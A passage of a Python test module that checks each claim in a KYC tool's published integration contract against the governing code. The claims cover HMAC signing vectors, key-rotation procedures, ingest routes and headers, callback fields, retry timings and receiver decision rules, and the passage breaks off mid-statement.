"""Every registry claim, held against an INDEPENDENT executable authority.

This file exists because a shared registry is not evidence (re-audit `82636da..9ac574f`, systemic
prevention requirement). If the generator and the test both read the same wrong value they agree
with each other and stay wrong. So nothing here compares the registry to itself: each literal
written in `docs/contracts/` is checked against the thing that actually governs it — a Pydantic
model, a Settings default, a runtime function, a route table, a shipped canonical record, or, for
the blocker, by executing the factory and observing that it refuses.

THE MAP IS CLOSED (re-audit `6feca36..4f23f23` F4). `AUTHORITY_VERIFIERS` holds exactly one
verifier per claim id, and `test_the_verifier_map_is_closed_over_both_registries` asserts its keys
equal the registries' ids exactly. Adding a claim without a verifier fails; deleting a claim while
leaving its verifier behind fails. The previous arrangement was a pile of independently named
tests, which meant an unverified claim was invisible — it simply had no test, and nothing said so.

`test_contract_rendering.py` is the other half: it proves the rendered PDF displays these values.
"""

import ast
import dataclasses
import hashlib
import math
import re
import time
from pathlib import Path
from unittest import mock

import pytest
from alembic.config import Config
from alembic.script import ScriptDirectory
from docs.contracts import ClaimState, playbook
from docs.contracts import wire as wire_module
from docs.contracts.operations import OPERATIONS, Procedure
from docs.contracts.signing_example import sign as example_sign
from docs.contracts.wire import WIRE
from pydantic import ValidationError as PydanticValidationError

from kyc_tool.api import schemas
from kyc_tool.api.schemas import (
    PAYLOAD_MODELS,
    DecisionCallback,
    EventEnvelope,
    EventType,
    GatesBody,
)
from kyc_tool.config import (
    STUB_ADAPTERS_PROFILE,
    STUB_EMAIL_PROVIDER,
    STUB_OCR_ENGINE,
    ProcessRole,
    ProductionConfigError,
    Settings,
    hmac_extra_key_violations,
    production_config_violations,
    validate_process_role,
)
from kyc_tool.ops import cutover
from kyc_tool.outbox import publisher
from kyc_tool.queue.backoff import saturating_backoff_seconds
from kyc_tool.security import (
    DIRECTION_INBOUND,
    DIRECTION_OUTBOUND,
    MAX_HMAC_SKEW_SECONDS,
    canonical_v2,
    sign_v2,
)
from tests import roadmap

from .test_production_config import hardened

REPO = Path(__file__).resolve().parents[2]
SRC = REPO / "src" / "kyc_tool"


# ── the closed map ────────────────────────────────────────────────────────────────────────────────
AUTHORITY_VERIFIERS: dict[str, object] = {}


def verifies(claim_id: str):
    """Register the ONE verifier for `claim_id`.

    One id per function, deliberately. A verifier shared across several claims can check one of
    them and still look like coverage for the rest — the same "agrees with itself" failure this
    file exists to prevent, moved up a level.
    """

    def register(fn):
        if claim_id in AUTHORITY_VERIFIERS:
            raise AssertionError(f"{claim_id} already has a verifier: {AUTHORITY_VERIFIERS[claim_id]}")
        AUTHORITY_VERIFIERS[claim_id] = fn
        return fn

    return register


def _declared_routes() -> set[tuple[str, str]]:
    """(method, path) for every route the app declares, WITHOUT booting the app.

    `create_app()` opens a database connection, which a unit test must not require. The routers are
    importable objects, and the two probes are registered by decorator inside the factory, so those
    are read structurally from the AST — a decorator literal, not a substring of the file.
    """
    from kyc_tool.api import routes_events, routes_metrics, routes_ops, routes_read

    found = set()
    for module in (routes_events, routes_metrics, routes_ops, routes_read):
        for route in module.router.routes:
            for method in route.methods:
                found.add((method, route.path))

    tree = ast.parse((SRC / "api" / "app.py").read_text())
    for node in ast.walk(tree):
        if not isinstance(node, ast.FunctionDef):
            continue
        for decorator in node.decorator_list:
            call = decorator if isinstance(decorator, ast.Call) else None
            if call is None or not isinstance(call.func, ast.Attribute):
                continue
            target = call.func.value
            if isinstance(target, ast.Name) and target.id == "app" and call.args:
                literal = call.args[0]
                if isinstance(literal, ast.Constant) and isinstance(literal.value, str):
                    found.add((call.func.attr.upper(), literal.value))
    return found


# ── signing ───────────────────────────────────────────────────────────────────────────────────────
def _vector_fields(vector: dict) -> dict:
    return {
        "key_id": vector["key_id"],
        "direction": vector["direction"],
        "method": vector["method"],
        "path_qs": vector["path_qs"],
        "timestamp": vector["timestamp"],
        "slot": vector["slot"],
        "body": vector["body"],
    }


@verifies("WIRE.SIGN.COMPANION")
def _the_companion_file_is_the_bytes_the_document_names():
    """Execute the SHIPPED FILE, not the module it was generated from.

    Re-audit `4f23f23..122cc67` finding 4. The document used to promise the printed block was
    copyable; the test that "proved" it reconstructed indentation from glyph x-offsets and Courier
    advance widths, which is a decoder no reader has. Exact `pdftotext` output does not compile.
    So the document now names a file and its digest, and this executes exactly those bytes.
    """
    from docs.contracts.companion import (
        ARTIFACT_NAME,
        artifact_digest,
        artifact_path,
        artifact_text,
    )

    path = artifact_path()
    assert path.exists(), f"{ARTIFACT_NAME} is not in the repo; run docs.contracts.companion"
    on_disk = path.read_text()
    assert on_disk == artifact_text(), (
        f"{ARTIFACT_NAME} has drifted from the snippet it is generated from; regenerate it"
    )

    # the digest the document prints is over the RUNNABLE BODY, and it is correct
    body = on_disk.split('"""', 2)[2].lstrip("\n")
    assert hashlib.sha256(body.encode()).hexdigest() == artifact_digest()
    assert artifact_digest() in on_disk, "the file does not state its own digest"

    # and the file runs and reproduces the published vector
    namespace: dict = {}
    exec(compile(on_disk, str(path), "exec"), namespace)  # noqa: S102
    v = WIRE.value("WIRE.SIGN.VECTOR")
    assert namespace["sign"](v["secret"], **_vector_fields(v)) == v["signature"]

    claim = WIRE.value("WIRE.SIGN.COMPANION")
    assert ARTIFACT_NAME in claim
    assert "shasum -a 256" in claim
    assert "not supported" in claim, "the document still promises copying off the page"


@verifies("WIRE.SIGN.VECTOR")
def _vector_is_bound_end_to_end():
    """Body, byte count, body hash, ordered canonical block, signature, and the published snippet
    all recomputed from kyc_tool.security. Change any one part and this fails, which is what
    'bound' means: an earlier version checked the digest and the hash independently, so an altered
    body carrying a stale hash passed."""
    v = WIRE.value("WIRE.SIGN.VECTOR")
    fields = _vector_fields(v)

    assert len(v["body"]) == v["body_bytes"]
    assert hashlib.sha256(v["body"]).hexdigest() == v["body_sha256"]

    canonical = canonical_v2(**fields)
    assert tuple(canonical.split("\n")) == v["canonical_lines"], "canonical block drifted or reordered"
    assert canonical.split("\n")[-1] == v["body_sha256"], "the canonical tail is not this body's hash"

    assert sign_v2(v["secret"], **fields) == v["signature"]
    # the snippet TechCraft copies, executed against the shipped signer
    assert example_sign(v["secret"], **fields) == v["signature"]


@verifies("WIRE.SIGN.DIRECTIONS")
def _direction_tokens_match_the_signer_literals():
    directions = WIRE.value("WIRE.SIGN.DIRECTIONS")
    assert directions["platform_to_tool"] == DIRECTION_INBOUND
    assert directions["tool_to_platform"] == DIRECTION_OUTBOUND
    assert WIRE.value("WIRE.SIGN.VECTOR")["direction"] == DIRECTION_INBOUND


@verifies("WIRE.SIGN.CANONICAL")
def _canonical_field_order_matches_the_signer():
    """The documented field names, in order, against a canonical string built from placeholders."""
    documented = WIRE.value("WIRE.SIGN.CANONICAL")
    probe = canonical_v2(
        key_id="K",
        direction=DIRECTION_INBOUND,
        method="M",
        path_qs="P",
        timestamp="T",
        slot="S",
        body=b"",
    ).split("\n")
    # The published NAMES, exactly and in order. Checking only the count and the literal "v2"
    # let `key_id` be renamed to `NOT_KEY_ID` on the page (re-audit `4f23f23..97deeae` F3): an
    # integrator building the canonical string from the document would sign a different message
    # from the one we verify, and every request would 401 with no way to see why.
    assert tuple(documented) == (
        "v2", "key_id", "direction", "method", "path?query", "timestamp", "slot",
        "sha256(body) hex",
    ), "the published canonical field names changed"
    assert len(documented) == len(probe) == 8
    assert documented[0] == probe[0] == "v2"
    for position, placeholder in ((1, "K"), (2, DIRECTION_INBOUND), (3, "M"), (4, "P"), (5, "T"), (6, "S")):
        assert probe[position] == placeholder, f"canonical position {position} moved"
    assert probe[7] == hashlib.sha256(b"").hexdigest()


@verifies("WIRE.SIGN.SKEW_SECONDS")
def _skew_window_matches_the_verifier():
    assert WIRE.value("WIRE.SIGN.SKEW_SECONDS") == MAX_HMAC_SKEW_SECONDS


@verifies("WIRE.SIGN.ROTATION")
def _rotation_publishes_an_executable_procedure_for_each_direction():
    """Both directions, both orders, and the reason each order is what it is.

    Re-audit `4f23f23..122cc67` finding 9. The previous version named the asymmetry but was not
    executable: inbound said "add a second key id, cut over, then retire the old one" and omitted
    the PROMOTION — a literal reading removes the entry while the old key is still ACTIVE, which
    leaves no active key at all. Outbound told TechCraft to retire once callbacks appear under the
    new key, which in a mixed fleet does not prove an old-key signer is gone.
    """
    lines = WIRE.value("WIRE.SIGN.ROTATION")
    # gate finding 13: the lines are the DERIVATION of the closed step records — an appended
    # override instruction has no syntax, and retirement semantics outside the derived lines
    # are refused by name
    assert tuple(lines) == wire_module.rotation_lines(), (
        "the published rotation lines diverge from the closed-step derivation"
    )
    assert wire_module.rotation_prose_problems(lines) == []
    inbound = next(line for line in lines if line.startswith("INBOUND"))
    outbound = next(line for line in lines if line.startswith("OUTBOUND"))

    # inbound: the overlap map exists and enforces the active key's floor
    assert hmac_extra_key_violations({"old": "s" * 32}, "active") == []
    assert any("weak" in v for v in hmac_extra_key_violations({"old": "s" * 31}, "active"))
    assert any("blank" in v for v in hmac_extra_key_violations({"": "s" * 32}, "active"))
    assert any("collides" in v for v in hmac_extra_key_violations({"active": "s" * 32}, "active"))

    # ...and the published order includes the promotion, in the right place
    assert "PROMOTE" in inbound, "the inbound procedure still omits promoting the new key"
    assert inbound.index("PROMOTE") < inbound.index("remove the old"), (
        "the old entry is removed before the new key is promoted"
    )
    assert any("no active key" in line for line in lines), (
        "nothing explains why deleting before promoting is unsafe"
    )

    # audit `4c3015a..cccd5f7` finding 3, folded fail-closed: the two retirement steps are marked
    # BLOCKED in the procedure text itself, and each gate's transition clause appears verbatim in
    # its own direction's line. The audit's reproduction — replacing phase 4 with "wait one second
    # whether or not old-key requests still arrive" — breaks this bind instead of passing.
    gates = {g.direction: g for g in WIRE.value("WIRE.SIGN.ROTATION_RETIREMENT")}
    assert set(gates) == {"INBOUND", "OUTBOUND"}
    assert gates["INBOUND"].transition in inbound, (
        "the inbound line no longer carries the gated proof clause; the gate binds nothing"
    )
    assert "BLOCKED" in inbound, "the inbound proof step reads as available again"
    assert gates["OUTBOUND"].transition in outbound, (
        "the outbound line no longer carries the gated retire clause; the gate binds nothing"
    )
    assert "BLOCKED" in outbound, "the outbound retire step reads as available again"

    # outbound: exactly ONE signer, so the overlap cannot live here and the drain is required
    publisher = (SRC / "outbox" / "publisher.py").read_text()
    assert publisher.count("hmac_outbound_secret") == 1, (
        "the publisher now references more than one outbound secret; if it can hold an overlap, "
        "the drained procedure below is no longer the only safe one"
    )
    assert "hmac_outbound_extra_keys" not in set(Settings.model_fields)
    assert "OVERLAP IS YOURS TO HOLD" in outbound
    assert outbound.index("You start accepting") < outbound.index("attest ZERO publishers")
    assert outbound.index("attest ZERO publishers") < outbound.index("deploy the sole new signer")
    assert outbound.index("deploy the sole new signer") < outbound.index("retire the old key")
    assert any("mixed fleet" in line and "dead-letter" in line for line in lines), (
        "nothing explains why one new-key callback is not evidence"
    )

    # the drain MECHANISM is a real, named capability — outbound phase 2's hard-stop is not an
    # aspiration. What does NOT exist is a signer-target attestation RECORD; that absence is held
    # by the retirement claim's own verifier, which is why phase 5 is BLOCKED above.
    assert hasattr(cutover, "OUTBOX_MAX_ATTEMPTS_CUTOVER")
    assert "attest zero publishers" in " ".join(
        OPERATIONS.value("OPS.CUTOVER.OUTBOX_CEILING")).lower()


@verifies("WIRE.SIGN.ROTATION_RETIREMENT")
def _rotation_retirement_is_unreachable_by_construction():
    """Audit `4c3015a..cccd5f7` finding 3, folded under the human decision "fail closed now,
    capability to ROADMAP" (PLAN-v2). The claim publishes BLOCKED where a reader would otherwise
    act; each gate refuses every evidence object constructible today; and the absence anchors are
    EXECUTABLE — shipping any part of the per-key evidence capability fails this verifier, which
    forces the claim, the gates, and the ROADMAP unit forward in the same change."""
    claim = WIRE["WIRE.SIGN.ROTATION_RETIREMENT"]
    assert claim.state is ClaimState.BLOCKED, "retirement was quietly promoted out of BLOCKED"
    gates = claim.value
    assert [g.direction for g in gates] == ["INBOUND", "OUTBOUND"]
    rotation = WIRE.value("WIRE.SIGN.ROTATION")
    for gate in gates:
        line = next(ln for ln in rotation if ln.startswith(gate.direction))
        assert gate.transition in line, (
            f"{gate.direction}: the gated clause is no longer in the published procedure"
        )
        assert "BLOCKED" in line
        assert callable(gate.refuse), f"{gate.direction}: no executable gate"
        assert gate.must_reject, f"{gate.direction}: names no refused specimen"
        for label, evidence in gate.must_reject:
            reasons = gate.refuse(evidence)
            assert reasons, f"{gate.direction}: {label} was accepted"
            assert all(isinstance(r, str) and r for r in reasons)
        assert gate.refuse("not a mapping"), f"{gate.direction}: non-mapping evidence accepted"
        assert gate.why_blocked.strip() and gate.unblocked_by.strip()

    # the absence anchors, executable. A per-key witness, a per-key schema surface, a receipt
    # schema, or a signer-target cutover record appearing ANYWHERE below fails this test.
    from kyc_tool.api import hmac_witness
    from kyc_tool.db import tables as db_tables

    witness_tree = ast.parse((SRC / "api" / "hmac_witness.py").read_text())
    witness_functions = {
        node.name for node in witness_tree.body
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))
    }
    assert witness_functions == {"record_v1_accepted", "inbound_v1_zero", "observation_state"}, (
        "kyc_tool.api.hmac_witness changed shape; if a per-key witness shipped, this claim, its "
        "gates, and ROADMAP PR 5c must move in the same change"
    )
    for node in ast.walk(witness_tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            arg_names = [a.arg for a in node.args.args + node.args.kwonlyargs]
            assert "key_id" not in arg_names, f"{node.name} now takes a key_id"
    assert getattr(hmac_witness, "inbound_zero_for_key", None) is None
    observation_columns = {c.name for c in db_tables.HmacV1Observation.__table__.columns}
    assert observation_columns == {
        "id", "observation_started_at", "accepted_count", "last_accepted_at"}, (
        "hmac_v1_observation grew columns; a per-key witness must move this claim forward"
    )
    hmac_tables = {name for name in db_tables.Base.metadata.tables if name.startswith("hmac")}
    assert hmac_tables == {"hmac_v1_observation", "hmac_signature_stats"}
    assert frozenset({"KYC_OUTBOX_MAX_ATTEMPTS"}) == cutover._ALLOWED_SETTINGS, (
        "the closed cutover record now governs more than the outbox ceiling; a signer-target "
        "record must move this claim forward"
    )
    drained_records = {
        name for name, value in vars(cutover).items()
        if isinstance(value, cutover.DrainedCutover)
    }
    assert drained_records == {"OUTBOX_MAX_ATTEMPTS_CUTOVER"}
    assert getattr(cutover, "HMAC_SIGNER_CUTOVER", None) is None
    assert wire_module.SIGNED_FLEET_RECEIPT_SCHEMA is None
    # gate finding 13: the typed slot is the named extension point — anything but a
    # MissingCapability here means a provider registered, and this claim must move with it
    assert isinstance(wire_module.RETIREMENT_AUTHORITY, wire_module.MissingCapability), (
        "a retirement authority is registered; the claim, gates, and ROADMAP unit must move "
        "in the same change"
    )
    assert wire_module.RETIREMENT_AUTHORITY.roadmap_unit == "PR 5c"

    # the reserved, unbuilt ROADMAP unit — reserved WITHOUT a migration or a shipped/pending state
    row = next((r for r in roadmap.records() if r[0] == "PR 5c"), None)
    assert row is not None, "ROADMAP §C reserves no PR 5c unit for the retirement evidence"
    _unit, state, revisions = row
    assert state == "future" and revisions == [], (
        "PR 5c must stay an explicit `future` reservation without a migration (gate F12)"
    )
    assert not roadmap.future_unit_problems(roadmap.ROADMAP.read_text())


@verifies("WIRE.SIGN.V1_SUNSET")
def _v1_sunset_dates_are_unset_in_our_config():
    """The document once published 2026-09-01 / 2026-10-01 as commitments. Those dates came from
    the `hardened()` TEST FIXTURE; the shipped config leaves both unset. Assert the shipped file,
    so republishing a fixture value fails here."""
    env = (REPO / ".env.example").read_text()
    for variable in ("KYC_HMAC_V1_INBOUND_SUNSET_AT", "KYC_HMAC_V1_OUTBOUND_SUNSET_AT"):
        line = next(line for line in env.splitlines() if line.startswith(variable + "="))
        value = line.split("=", 1)[1].split("#")[0].strip()
        assert value == "", f"{variable} now ships a value; the claim says both are unset"
    claim = WIRE.value("WIRE.SIGN.V1_SUNSET")
    assert "unset in our config" in claim
    assert not re.search(r"20\d\d-\d\d-\d\d", claim), "the claim is publishing a concrete date again"
    assert "observation window" in claim


# ── ingestion ─────────────────────────────────────────────────────────────────────────────────────
@verifies("WIRE.INGEST.PATH")
def _ingest_path_is_a_declared_route():
    method, _, path = WIRE.value("WIRE.INGEST.PATH").partition(" ")
    assert (method, path) in _declared_routes(), "the documented ingest route is not registered"


@verifies("WIRE.INGEST.HEADERS")
def _documented_headers_are_the_ones_the_verifier_reads():
    """Signs a request using EXACTLY the four documented header names and asserts it verifies —
    then renames each in turn and asserts a 401. A name-presence check against the source would
    pass on a header the verifier no longer reads; this fails unless each name is load-bearing."""
    from fastapi import HTTPException

    from kyc_tool.api import auth

    documented = WIRE.value("WIRE.INGEST.HEADERS")
    assert len(documented) == len(set(documented)) == 4
    idempotency, timestamp_header, key_id_header, signature_header = documented

    settings = hardened()
    path_qs = "/v1/cases/c/events"
    body = b'{"probe":1}'
    slot = "slot-1"
    stamp = str(int(time.time()))
    signature = sign_v2(
        settings.hmac_inbound_secret,
        key_id=settings.hmac_inbound_key_id,
        direction=DIRECTION_INBOUND,
        method="POST",
        path_qs=path_qs,
        timestamp=stamp,
        slot=slot,
        body=body,
    )
    good = {
        idempotency: slot,
        timestamp_header: stamp,
        key_id_header: settings.hmac_inbound_key_id,
        signature_header: signature,
    }

    def _request(headers):
        class _App:
            class state:
                session_factory = None

        class _Req:
            method = "POST"
            app = _App()
            scope = {"path": path_qs, "query_string": b"", "raw_path": path_qs.encode()}

            class url:
                path = path_qs
                query = ""

        request = _Req()
        request.headers = headers
        return request

    auth.require_valid_signature(settings, _request(good), body)  # must not raise

    for name in documented:
        renamed = {("X-Wrong-" + k if k == name else k): value for k, value in good.items()}
        with pytest.raises(HTTPException) as excinfo:
            auth.require_valid_signature(settings, _request(renamed), body)
        assert excinfo.value.status_code == 401, f"renaming {name} did not change the outcome"


@verifies("WIRE.INGEST.STATUS")
def _documented_status_codes_are_the_ones_ingest_returns():
    """202 for a queued event and 200 for replay-or-inline are the pair most likely to be
    misbuilt, so they are asserted against the source of the outcomes themselves."""
    documented = dict(WIRE.value("WIRE.INGEST.STATUS"))
    source = (SRC / "events" / "ingest.py").read_text()
    assert 202 in documented and 200 in documented
    assert "IngestOutcome(202" in source, "ingest no longer returns 202 for a queued event"
    assert "IngestOutcome(200" in source
    assert "queued" in documented[202]
    assert "replay" in documented[200].lower() and "inline" in documented[200].lower()
    for code in (400, 401, 409, 422, 404):
        assert code in documented


@verifies("WIRE.INGEST.EXTRA_FIELDS")
def _extra_field_policy_matches_the_models():
    claim = WIRE.value("WIRE.INGEST.EXTRA_FIELDS")
    assert EventEnvelope.model_config.get("extra") == claim["envelope"] == "forbid"
    for model in PAYLOAD_MODELS.values():
        assert model.model_config.get("extra") == claim["payload"] == "allow"


@verifies("WIRE.INGEST.ORDERING")
def _ingest_ordering_is_the_case_lock_it_claims():
    """The claim's whole point is that same-case order is lock-acquisition order, not send order.
    Its authority is the case-level FOR UPDATE admission in ingest; if that lock goes, the claim
    is describing a guarantee nothing provides."""
    source = (SRC / "events" / "ingest.py").read_text()
    assert "with_for_update=True" in source, "ingest no longer takes the case lock to admit events"
    assert "Case" in source
    claim = WIRE.value("WIRE.INGEST.ORDERING").lower()
    assert "lock-acquisition order" in claim
    assert "need not match your send order" in claim


@verifies("WIRE.EVENT.TABLE")
def _event_table_matches_the_payload_models_exactly():
    """Names AND field lists, both directions. An earlier guard only checked that accepted names
    appeared somewhere in the prose, so a documented-but-rejected event, or a required field that
    quietly moved, both passed."""
    table = {row[0]: row for row in WIRE.value("WIRE.EVENT.TABLE")}
    assert set(table) == set(EventType.__args__) == set(PAYLOAD_MODELS)

    for event_type, model in PAYLOAD_MODELS.items():
        required = tuple(sorted(f for f, i in model.model_fields.items() if i.is_required()))
        optional = tuple(sorted(f for f, i in model.model_fields.items() if not i.is_required()))
        _, documented_required, documented_optional, _ = table[event_type]
        assert tuple(sorted(documented_required)) == required, f"{event_type} required fields"
        assert tuple(sorted(documented_optional)) == optional, f"{event_type} optional fields"


@verifies("WIRE.ACTOR.SENSITIVE")
def _sensitive_actor_rule_matches_the_guard():
    from kyc_tool.events.review_guard import reviewer_actor_reason

    claim = WIRE.value("WIRE.ACTOR.SENSITIVE")
    assert set(claim["events"]) == {"website.review_completed", "reviewer.manual_approve"}
    ok = {"type": claim["actor_type"], "id": "rev-1"}
    assert reviewer_actor_reason(ok, {"reviewer_id": "rev-1"}) is None
    # every failure the prose promises
    assert reviewer_actor_reason({"type": "user", "id": "rev-1"}, {"reviewer_id": "rev-1"})
    assert reviewer_actor_reason(ok, {"reviewer_id": "REV-1"})  # case-sensitive
    assert reviewer_actor_reason({"type": "reviewer", "id": "  "}, {"reviewer_id": "  "})
    assert reviewer_actor_reason(ok, {"reviewer_id": "other"})


# ── callbacks ─────────────────────────────────────────────────────────────────────────────────────
@verifies("WIRE.CALLBACK.PATH")
def _callback_path_is_the_suffix_the_publisher_appends():
    documented = WIRE.value("WIRE.CALLBACK.PATH")
    method, _, target = documented.partition(" ")
    assert method == "POST"
    suffix = target.split(">", 1)[1]
    publisher = (SRC / "outbox" / "publisher.py").read_text()
    assert f'/{suffix.lstrip("/")}"' in publisher.replace("'", '"'), (
        "the publisher no longer appends the documented suffix"
    )
    # the suffix is why a base URL carrying a query or fragment is refused at boot
    assert production_config_violations(hardened(platform_callback_url="https://platform.example/kyc?x=1"))


@verifies("WIRE.CALLBACK.FIELDS")
def _callback_required_fields_match_the_wire_model():
    required = {f for f, i in DecisionCallback.model_fields.items() if i.is_required()}
    assert set(WIRE.value("WIRE.CALLBACK.FIELDS")) == required


@verifies("WIRE.CALLBACK.OPTIONAL_FIELDS")
def _callback_optional_fields_match_the_wire_model():
    optional = {f for f, i in DecisionCallback.model_fields.items() if not i.is_required()}
    assert set(WIRE.value("WIRE.CALLBACK.OPTIONAL_FIELDS")) == optional


@verifies("WIRE.CALLBACK.GATES")
def _callback_gates_match_the_gates_model():
    assert set(WIRE.value("WIRE.CALLBACK.GATES")) == set(GatesBody.model_fields)


@verifies("WIRE.CALLBACK.DECISIONS")
def _documented_decisions_are_the_wire_literal():
    documented = set(WIRE.value("WIRE.CALLBACK.DECISIONS"))
    annotation = DecisionCallback.model_fields["decision"].annotation
    assert documented == set(annotation.__args__)


@verifies("WIRE.CALLBACK.RETRY")
def _retry_schedule_recomputes_from_the_shipped_backoff():
    claim = WIRE.value("WIRE.CALLBACK.RETRY")
    settings = Settings()
    assert claim["attempts"] == settings.outbox_max_attempts
    assert claim["base_seconds"] == settings.outbox_backoff_base_seconds
    delays = tuple(
        int(saturating_backoff_seconds(settings.outbox_backoff_base_seconds, n))
        for n in range(1, settings.outbox_max_attempts)
    )
    assert claim["delays"] == delays
    assert claim["backoff_total_seconds"] == sum(delays)
    walls = settings.outbox_max_attempts * 4 * settings.outbox_http_timeout_seconds
    assert claim["worst_case_seconds"] == sum(delays) + walls
    # minutes round UP: understating the window would have an operator give up too early
    assert claim["backoff_total_minutes"] == math.ceil(sum(delays) / 60)
    assert claim["worst_case_minutes"] == math.ceil(claim["worst_case_seconds"] / 60)


@verifies("WIRE.CALLBACK.DELIVERY")
def _delivery_claim_carries_all_three_outcomes():
    """A6 permits zero sends for a SUPPRESSED row, so an at-least-once-only description is an
    overclaim. Dead-lettered is the opposite error: it means sent without a witnessed success, and
    a reader who treats it as 'not sent' double-applies."""
    lines = WIRE.value("WIRE.CALLBACK.DELIVERY")
    text = " ".join(lines).lower()
    assert "at least once" in text and "zero sends" in text and "dead-letter" in text
    assert "exactly once" not in text and "exactly one" not in text
    suppressed = next(line.lower() for line in lines if "suppressed" in line.lower())
    assert "zero sends" in suppressed
    dead = next(line.lower() for line in lines if line.startswith("DEAD-LETTERED"))
    assert "does not mean zero sends" in dead, "dead-lettered must not read as never sent"
    assert str(Settings().outbox_max_attempts) in dead or "eight" in dead


@verifies("WIRE.CALLBACK.RECEIVER_TXN")
def _receiver_transaction_requires_commit_before_2xx():
    steps = [s.lower() for s in WIRE.value("WIRE.CALLBACK.RECEIVER_TXN")]
    commit = next(i for i, s in enumerate(steps) if s.startswith("commit"))
    respond = next(i for i, s in enumerate(steps) if "return 2xx" in s)
    assert commit < respond, "the receiver contract must commit BEFORE returning 2xx"
    # recording is unconditional; whether it APPLIES is a separate decision (EFFECTIVENESS)
    assert any("either way" in s for s in steps)


@verifies("WIRE.CALLBACK.EFFECTIVENESS")
def _effectiveness_table_is_executable_and_total():
    """The authority here is an ALGORITHM, not a sentence.

    The previous verifier checked that "manual" and "not" appeared in some line, which the broken
    "otherwise apply" version satisfied while replacing a newer decision with an older one
    (re-audit `4f23f23..97deeae` F2). The table is now held against
    `docs/contracts/receiver_reference.py`, which implements it and is driven through the findings'
    own scenarios by `tests/unit/test_receiver_state_machine.py`; here we prove the published rows
    and that implementation are the same object of study.
    """
    from docs.contracts import predicates
    from docs.contracts.receiver_reference import Callback, LedgerState, decide
    from docs.contracts.wire import INTERIM, POST_024, RECEIVER_TRANSITIONS

    rows = WIRE.value("WIRE.CALLBACK.EFFECTIVENESS")
    assert rows is RECEIVER_TRANSITIONS
    assert {t.phase for t in rows} == {INTERIM, POST_024}
    assert not any("otherwise" in t.condition.lower() for t in rows)

    # ── the partition property (re-audit `4cb2cb7` F10) ──────────────────────────────────────
    # "Four rows plus token presence" was the totality check Codex got through: an overlapping
    # manual/automatic predicate, an uncovered sequence relation, a deleted row, and a shadowed
    # extra row all kept four rows and every token. Enumeration over the closed state space is
    # the property all four mutations break: every state matches EXACTLY ONE row.
    for phase in (INTERIM, POST_024):
        phase_rows = [t for t in rows if t.phase == phase]
        problems = predicates.partition_problems(phase_rows)
        assert not problems, f"{phase}: {problems}"
        # the duplicate row is the published entry point of each phase — evaluation order is
        # part of the contract the PDF prints, even though a partition makes selection
        # order-independent
        assert phase_rows[0].when.duplicate == frozenset({predicates.DUP})

    # ── the INDEPENDENT ORACLE (gate audit `6c4f54a..91fbde3` finding 2) ────────────────────
    # `decide()` reads its outcome off the published row, so comparing the two was the row
    # agreeing with itself: a coordinated boolean flip INSTALLED in the real table stayed green.
    # This oracle restates the accepted invariants directly — a second, independent statement of
    # the answer for every state — and BOTH the published rows and the executed decisions are
    # held to it.
    def oracle(phase, observed):
        """(records, effective, advances) from the accepted invariants, not from any row."""
        if observed["duplicate"] == predicates.DUP:
            return (False, False, False)  # at-least-once delivery: acknowledge, append nothing
        if phase == INTERIM:
            # no wire ordering authority: only a case with nothing in force may apply
            return (True, observed["source"] == predicates.SRC_NONE, False)
        if observed["sequence"] != predicates.SEQ_ABOVE:
            return (True, False, False)  # no proven order: record only
        if observed["source"] == predicates.SRC_MANUAL:
            return (True, False, True)  # manual holds; the mark still moves on proven order
        return (True, True, True)  # proven order, nothing manual in force: apply

    for phase in (INTERIM, POST_024):
        phase_rows = [t for t in rows if t.phase == phase]
        for observed in predicates.state_space():
            (expected_row,) = [i for i, r in enumerate(phase_rows) if r.when.matches(observed)]
            row = phase_rows[expected_row]
            assert (row.records, row.becomes_effective, row.advances_high_water) == oracle(
                phase, observed), (
                f"{phase} {observed}: the published row disagrees with the invariant oracle"
            )

    # ── the evaluator executes THESE predicates, not a private restatement ──────────────────
    # Every state is realized as a concrete (LedgerState, Callback) and driven through decide();
    # the returned row index must be the enumeration's unique match, and the outcome must equal
    # the ORACLE's answer — so a drifted branch and a flipped row both fail, independently.
    def realize(observed):
        run_id = "r-seen" if observed["duplicate"] == predicates.DUP else "r-new"
        source = {predicates.SRC_NONE: None, predicates.SRC_MANUAL: "manual",
                  predicates.SRC_AUTOMATIC: "automatic"}[observed["source"]]
        sequence = {predicates.SEQ_ABSENT: None, predicates.SEQ_NOT_ABOVE: 3,
                    predicates.SEQ_ABOVE: 9}[observed["sequence"]]
        state = LedgerState(seen_run_ids=frozenset({"r-seen"}), current_source=source,
                            high_water=5,
                            current_manual_event_id=(
                                "M1" if source == "manual" else None))
        return state, Callback(case_id="c", run_id=run_id, decision_sequence=sequence)

    for phase in (INTERIM, POST_024):
        phase_rows = [t for t in rows if t.phase == phase]
        for observed in predicates.state_space():
            (expected_row,) = [i for i, r in enumerate(phase_rows) if r.when.matches(observed)]
            state, callback = realize(observed)
            outcome = decide(state, callback, phase=phase)
            assert outcome.row == expected_row, (phase, observed)
            assert (outcome.record, outcome.effective, outcome.advance_high_water) == oracle(
                phase, observed), (
                f"{phase} {observed}: the executed decision disagrees with the invariant oracle"
            )
            assert not outcome.completes_release, "the base tables can never complete a release"

    # ── the published text is the predicate's own derivation AND parses back to it ──────────
    # Derivation alone compares the claim to itself; the parse is the independent direction
    # (gate finding 3): the RENDERED text, read under the published grammar, must denote exactly
    # the row's predicate.
    for transition in rows:
        assert transition.condition == transition.when.condition()
        assert predicates.parse_condition(transition.condition) == transition.when, (
            f"{transition.phase}: {transition.condition!r} does not parse back to its predicate"
        )
        # re-audit finding 1: every visible cell REBINDS to the closed records each run, so a
        # tampered cell cannot outlive one verification and a contradictory kind cannot construct
        kind = wire_module.OUTCOME_KINDS[transition.outcome]
        assert transition.record == kind.record_text
        assert transition.effective == kind.effective_text
        assert transition.why == wire_module.REASON_TEXTS[transition.reason]
        assert (transition.records, transition.becomes_effective,
                transition.advances_high_water) == (
            kind.records, kind.becomes_effective, kind.advances_high_water)
        assert not wire_module.outcome_record_problems(
            kind.records, kind.becomes_effective, kind.advances_high_water,
            kind.completes_release, kind.record_text, kind.effective_text)

    # the one semantic the facet space cannot carry: ABOVE with NO recorded mark yet — the first
    # sequenced callback for a case — must still be ABOVE, not a fourth relation
    state = LedgerState(seen_run_ids=frozenset(), current_source=None, high_water=None)
    outcome = decide(state, Callback(case_id="c", run_id="r1", decision_sequence=1),
                     phase=POST_024)
    assert outcome.effective and outcome.advance_high_water

    # the two outcomes the finding turns on, executed
    late_older = decide(
